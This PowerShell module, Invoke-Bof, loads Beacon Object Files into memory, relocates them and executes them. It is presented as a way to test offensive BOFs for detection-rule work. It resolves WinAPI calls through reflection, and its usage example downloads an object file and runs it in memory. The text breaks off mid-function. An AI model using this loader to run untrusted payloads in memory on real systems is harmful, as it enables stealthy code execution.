function Invoke-Bof {
<#
.SYNOPSIS

This is a module used to test offensive BOFs to create better detection rules.
As many offensive developers publish many BOFs directly on GitHub, this module
can simplify writing unit tests for detection rules.

This script will load the BOF file (aka COFF file) into memory, map all sections, 
perform relocation, serialize beacon parameters, and jump into the entry point 
selected by the user.

Many technics or functions are directly inspired by PowerSploit offensive scripts.

Author: citronneur, Twitter: @citronneur   
License: Apache License 2.0  
Required Dependencies: None  
Optional Dependencies: None  

.DESCRIPTION

Load and execute Beacon Object file into the current powershell process.

.PARAMETER BOFBytes

A byte array containing the beacon object file to load and execute.

.PARAMETER EntryPoint

Name of the function exported to execute in the beacon object file.

.PARAMETER ArgumentList

List of arguments that will be passed to the beacon, available through BeaconParse API.

.PARAMETER UnicodeStringParameter

All string parameter in ArgumentList will be converted into Unicode.

.EXAMPLE
$BOFBytes = (Invoke-WebRequest -Uri "https://github.com/airbus-cert/Invoke-BOF/raw/main/test/test_invoke_bof.x64.o").Content
Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList "foo",5

#>
    Param(
        [Parameter(Mandatory = $true, ParameterSetName = 'Path')]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $BOFBytes,

        [Parameter(Mandatory = $true)]
        [string]
        $EntryPoint,

        [Parameter(Mandatory = $false)]
        [System.Object[]]
        $ArgumentList,

        [Parameter(Mandatory = $false)]
        [Switch]
        $UnicodeStringParameter
    )

    ###################################
    ##########  Tools Stuff  ##########
    ###################################
    # Basic function to test admin rights
    # Use for Beacon API
    Function Test-IsAdmin 
    {
        $user = [Security.Principal.WindowsIdentity]::GetCurrent();
        (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator) 
    }

    ###################################
    #######  Arithmetic Stuff  ########
    ###################################
    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }

                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($FinalBytes, 0)
    }

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF

                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($FinalBytes, 0)
    }

    ###################################
    ##########  Win32 Stuff  ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

        ###########    STRUCT    ###########
        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct COFF_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('COFF_RELOCATION', $Attributes, [System.ValueType], 10)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SymbolTableIndex', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Type', [UInt16], 'Public') | Out-Null
        
        $COFF_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name COFF_RELOCATION -Value $COFF_RELOCATION

        #Struct COFF_SYMBOL
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('COFF_SYMBOL', $Attributes, [System.ValueType], 18)
        $TypeBuilder.DefineField('Value1', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Value2', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Value3', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SectionNumber', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Type', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('StorageClass', [Byte], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfAuxSymbols', [Byte], 'Public') | Out-Null
        
        $COFF_SYMBOL = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name COFF_SYMBOL -Value $COFF_SYMBOL

        #Struct COFF_SYMBOL_NAMED
        #There is no equivalent of union
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('COFF_SYMBOL_NAMED', $Attributes, [System.ValueType], 18)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('Value', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SectionNumber', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Type', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('StorageClass', [Byte], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfAuxSymbols', [Byte], 'Public') | Out-Null
        
        $COFF_SYMBOL_NAMED = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name COFF_SYMBOL_NAMED -Value $COFF_SYMBOL_NAMED


        return $Win32Types
    }

    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    function Get-ProcAddress
    {
        param
        (
            [OutputType([IntPtr])]

            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,

            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    
    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]

            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),

            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')

        Write-Output $TypeBuilder.CreateType()
    }

    # Use reflection to get pointer on interesting WinAPI
    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object

        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc

        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx

        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress

        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
        $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr

        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary

        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree

        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx

        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect

        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle

        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary

        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess

        $SetThreadTokenAddr = Get-ProcAddress Advapi32.dll SetThreadToken
        $SetThreadTokenDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [IntPtr]) ([Bool])
        $SetThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetThreadTokenAddr, $SetThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name SetThreadToken -Value $SetThreadToken

        return $Win32Functions
    }

    # Only keep interesting constant for linked API
    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object

        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000

        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_AMD64_ADDR64 -Value 0x1
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_AMD64_ADDR32NB -Value 0x3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_AMD64_REL32  -Value 0x4

        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SYM_CLASS_EXTERNAL  -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SYM_CLASS_STATIC  -Value 0x3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SYM_CLASS_LABEL  -Value 0x6

        return $Win32Constants
    }


    ######################
    ## Beacon API stuff ##
    ######################
    Function Get-BeaconTypes
    {
        $BeaconTypes = New-Object System.Object

        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

        #Struct datap Beacon Parser
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('datap', $Attributes, [System.ValueType], 24)
        $TypeBuilder.DefineField('original', [IntPtr], 'Public') | Out-Null
        $TypeBuilder.DefineField('buffer', [IntPtr], 'Public') | Out-Null
        $TypeBuilder.DefineField('length', [int], 'Public') | Out-Null
        $TypeBuilder.DefineField('size', [int], 'Public') | Out-Null
        
        $datap = $TypeBuilder.CreateType()
        $BeaconTypes | Add-Member -MemberType NoteProperty -Name datap -Value $datap

        #Struct formatp for beacon format
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('formatp', $Attributes, [System.ValueType], 24)
        $TypeBuilder.DefineField('original', [IntPtr], 'Public') | Out-Null
        $TypeBuilder.DefineField('buffer', [IntPtr], 'Public') | Out-Null
        $TypeBuilder.DefineField('length', [int], 'Public') | Out-Null
        $TypeBuilder.DefineField('size', [int], 'Public') | Out-Null
        
        $formatp = $TypeBuilder.CreateType()
        $BeaconTypes | Add-Member -MemberType NoteProperty -Name formatp -Value $formatp

        return $BeaconTypes
    }

    # Build Beacon API function that will be used
    # to resolve external ref on beacon
    Function Get-BeaconAPI
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $BeaconTypes,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )

        $script:BeaconTypes = $BeaconTypes
        $script:Win32Functions = $Win32Functions

        class BeaconAPI {
            ############################
            #      Data Parser API     #
            ############################

            # BeaconDataParse
            # $Parser must be initialized by the caller it's an unmanaged pointer to struct datap
            # $Buffer pointer generally get from entry point
            # $Size Size of $Buffer
            static [void] BeaconDataParse([IntPtr] $Parser, [IntPtr] $Buffer, [int] $Size)
            {
                $ParserObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Parser, [Type]$script:BeaconTypes.datap)
                $ParserObject.original = $Buffer
                $ParserObject.buffer = $Buffer
                $ParserObject.size = $Size
                $ParserObject.length = 0
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($ParserObject, $Parser, $false)
            }

            # Extract next data from the parser
            # $Parser must be initialized by the caller it's an unmanaged pointer to struct datap
            # $Size size of the output pointer
            # return pointer to an unmanaged memory region that is the next arguments
            static [IntPtr] BeaconDataExtractPrivate([IntPtr] $Parser, [ref]$Size)
            {
                $ParserObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Parser, [Type]$script:BeaconTypes.datap)

                if($ParserObject.length -eq $ParserObject.size)
                {
                    Write-Host "[!] Beacon asked more parameter than expected !!!"
                    return [IntPtr]::Zero
                }

                # read Length
                $ArgumentsHeader = New-Object Byte[] 4
                [IntPtr]$ArgumentsHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$ParserObject.buffer) ($ParserObject.length))
                [IntPtr]$ArgumentsBodyPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$ParserObject.buffer) ($ParserObject.length + 4))

                [System.Runtime.InteropServices.Marshal]::Copy([IntPtr]$ArgumentsHeaderPtr, $ArgumentsHeader, 0, 4)
                $ArgumentLength = [System.BitConverter]::ToInt32($ArgumentsHeader, 0)

                $Size.Value = $ArgumentLength

                $ParserObject.length += 4 + $ArgumentLength

                [System.Runtime.InteropServices.Marshal]::StructureToPtr($ParserObject, $Parser, $false)
                return $ArgumentsBodyPtr
            }

            # Extract next data from the parser
            # This function is exposed to BeaconAPI
            # $Parser must be initialized by the caller it's an unmanaged pointer to struct datap
            # $Size size of the output pointer
            # return pointer to an unmanaged memory region that is the next arguments
            static [IntPtr] BeaconDataExtract([IntPtr] $Parser, [IntPtr]$Size)
            {
                $SizeRef = New-Object Int32
                $Result = [BeaconAPI]::BeaconDataExtractPrivate($Parser, [ref]$SizeRef)

                if ($Size -ne [IntPtr]::Zero)
                {
                    [System.Runtime.InteropServices.Marshal]::Copy(@($SizeRef), 0, $Size, 1)
                }

                return $Result
            }

            # Parse next parameter as a 4 bytes integer
            # $Parser must be initialized by the caller it's an unmanaged pointer to struct datap
            # return integer or zero if parser can't parse anything
            static [int] BeaconDataInt([IntPtr] $Parser)
            {
                $SizeRef = New-Object Int32
                $IntPtr = [BeaconAPI]::BeaconDataExtractPrivate($Parser, [ref]$SizeRef)

                if (($IntPtr -eq [IntPtr]::Zero) -or ($SizeRef -ne 4))
                {
                    Write-Host "[!] Invalid parameter, expected int and have parameter of size" $SizeRef
                    return 0
                }

                $IntBytes = New-Object Byte[] 4
                [System.Runtime.InteropServices.Marshal]::Copy([IntPtr]$IntPtr, $IntBytes, 0, 4)
                return [System.BitConverter]::ToInt32($IntBytes, 0)
            }

            # Parse next parameter as a 2 bytes integer
            # As in powershell everything is integer, we always use integer and downcast it after
            # $Parser must be initialized by the caller it's an unmanaged pointer to struct datap
            # return integer or zero if parser can't parse anything
            static [int16] BeaconDataShort([IntPtr] $Parser)
            {
                return [int16][BeaconAPI]::BeaconDataInt($Parser)
            }

            # Return the current length of the data buffer
            static [int] BeaconDataLength([IntPtr] $Parser)
            {
                $ParserObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Parser, [Type]$script:BeaconTypes.datap)
                return $ParserObject.length
            }

            ############################
            #         Format API       #
            ############################

            # Allocate buffer for the format buffer
            static [void] BeaconFormatAlloc([IntPtr] $Format, [int] $Size)
            {
                $FormatObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Format, [Type]$script:BeaconTypes.formatp)
                $FormatObject.original = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Size)
                $FormatObject.buffer = $FormatObject.original
                $FormatObject.size = $Size
                $FormatObject.length = 0
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($FormatObject, $Format, $false)
            }

            # Free internal un managed memory
            static [void] BeaconFormatFree([IntPtr] $Format)
            {
                $FormatObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Format, [Type]$script:BeaconTypes.formatp)
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($FormatObject.original)
                $FormatObject.original = [IntPtr]::Zero
                $FormatObject.buffer = [IntPtr]::Zero
                $FormatObject.size = 0
                $FormatObject.length = 0
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($FormatObject, $Format, $false)
            }

            # reset all appended data
            static [void] BeaconFormatReset([IntPtr] $Format)
            {
                $FormatObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Format, [Type]$script:BeaconTypes.formatp)
                $FormatObject.length = 0
                $Reset = New-Object Byte[] $FormatObject.size
                [System.Runtime.InteropServices.Marshal]::Copy($Reset, 0, $FormatObject.buffer, $FormatObject.size)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($FormatObject, $Format, $false)
            }

            # Append new data to the format buffer
            static [void] BeaconFormatAppend([IntPtr] $Format, [IntPtr] $Text, [int] $Len)
            {
                $FormatObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Format, [Type]$script:BeaconTypes.formatp)

                # Copy from unmanaged to managed world
                $ManagedTemp = New-Object Byte[] $Len
                [System.Runtime.InteropServices.Marshal]::Copy($Text, $ManagedTemp, 0, $Len)

                $BufferOffset = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$FormatObject.buffer) ($FormatObject.length))
                [System.Runtime.InteropServices.Marshal]::Copy($ManagedTemp, 0, $BufferOffset, $Len)

                $FormatObject.length += $Len

                # Back to format
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($FormatObject, $Format, $false)
            }

            # Return the format buffer as a string buffer
            # Use with BeaconOutput
            static [IntPtr] BeaconFormatToString([IntPtr] $Format, [IntPtr] $Size)
            {
                $FormatObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Format, [Type]$script:BeaconTypes.formatp)

                if ($Size -ne [IntPtr]::Zero)
                {
                    [System.Runtime.InteropServices.Marshal]::Copy(@($FormatObject.length), 0, $Size, 1)
                }
                
                return $FormatObject.buffer
            }

            # Append integer to the format
            static [void] BeaconFormatInt([IntPtr] $Format, [int] $Val)
            {
                $FormatObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Format, [Type]$script:BeaconTypes.formatp)

                # now transfert to managed to unmanaged
                $BufferOffset = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$FormatObject.buffer) ($FormatObject.length))
                [System.Runtime.InteropServices.Marshal]::Copy(@([Int32]$Val), 0, $BufferOffset, 1)

                $FormatObject.length += 4
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($FormatObject, $Format, $false)
            }

            # Append formated buffer
            static [void] BeaconFormatPrintf ([IntPtr] $Format, [string] $Fmt, [IntPtr]$a1, [IntPtr]$a2)
            {
                $Value = [BeaconAPI]::Printf($Fmt, $a1, $a2)
                $ManagedTemp = [System.Text.Encoding]::ASCII.GetBytes($Value)

                $FormatObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Format, [Type]$script:BeaconTypes.formatp)

                $BufferOffset = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$FormatObject.buffer) ($FormatObject.length))
